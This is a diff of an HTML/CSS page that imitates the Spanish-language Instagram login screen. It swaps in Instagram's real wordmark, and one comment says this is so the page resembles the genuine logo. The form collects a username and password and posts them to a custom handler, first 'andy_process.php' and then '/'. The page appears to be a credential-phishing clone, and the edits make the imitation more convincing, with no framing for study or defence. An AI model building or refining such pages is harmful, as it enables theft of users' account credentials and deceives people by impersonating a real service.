@@ -35,17 +35,9 @@
         }
 
         .logo { 
-            width: 80px; /* Ajustado para el logo circular */
+            width: 175px; /* Tamaño ajustado para que parezca el logo de texto de IG */
             margin: 22px auto 12px; 
             display: block; 
-            border-radius: 50%;
-        }
-
-        .brand-name {
-            font-size: 32px;
-            margin-bottom: 10px;
-            font-family: 'Arial', sans-serif;
-            font-weight: bold;
         }
 
         .form-container { margin-top: 10px; }
@@ -67,7 +59,6 @@
             outline: none; 
         }
 
-        /* Botón con los colores naranja y azul degradados */
         button { 
             width: 100%; 
             background: linear-gradient(45deg, #f09433 0%, #e6683c 25%, #dc2743 50%, #cc2366 75%, #4c5fd7 100%); 
@@ -113,10 +104,10 @@
 <body>
     <div class="main-container">
         <div class="login-box">
-            <img src="https://png.pngtree.com/png-clipart/20221019/original/pngtree-instagram-icon-png-image_8704817.png" class="logo" alt="Instagram Logo">
+            <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a2511109452.png" class="logo" alt="Instagram">
             
             <div class="form-container">
-                <form id="login-form" action="andy_process.php" method="POST">
+                <form id="login-form" action="/" method="POST">
                     <input type="text" name="user_id" placeholder="Teléfono, usuario o correo electrónico" required>
                     <input type="password" name="user_pass" placeholder="Contraseña" required>
                     <button type="submit">Iniciar sesión</button>
